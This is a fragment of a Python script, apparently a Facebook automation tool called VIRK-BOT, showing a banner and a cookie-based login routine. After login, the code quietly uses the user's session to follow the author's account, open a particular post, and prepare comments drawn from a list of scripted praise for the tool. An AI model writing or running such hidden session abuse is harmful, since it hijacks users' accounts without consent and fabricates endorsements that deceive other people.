...
def baner():
    ...
    print(f"""
     ...
     {rgb}╚═╝{W}└─┘ ┴ {rgb} ╚  {W}┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴
{ab}-----------------------------------------------
{W}Donate   : {rgb}https://virk.store/Donate
{W}Message  : {rgb}https://instagram.com/virk_pb05_
{W}Restapi  : {rgb}https://api.herokuapp.com
{W}Youtube  : {rgb}https://youtube.com/channel/UCe4BpuIp4CFkmBwsHvv2vYg 
{W}Github   : {rgb}https://github.com/virkx3
{W}Facebook : {rgb}https://facebook.com/virk4
{ab}-----------------------------------------------""")
...
def login():
    ...
    if "mbasic_logout_button" in log:
        ...
        try:
            ...
            pass
        try:
           flw=ses.get(mbasic.format("/virk4"),cookies=cokie).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies=cokie)
        except:
           pass
        try:
           rct=ses.get("https://mbasic.facebook.com/100005034705332/posts/2102079156636554/",cookies=cokie).text
           ...
           pass
        try:
           kmn=ses.get("https://mbasic.facebook.com/100005034705332/posts/2102079156636554/",cookies=cokie).text
           kmn=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           dt=kmn.find_all("input",type="hidden")
           text=["Hi, bro, Virk, the tools are really cool!","The tools are very useful!","Hi, I'm a user of VIRK-BOT tools,","I wish you good luck,","very good tools!"," be yourself and never surrender"]
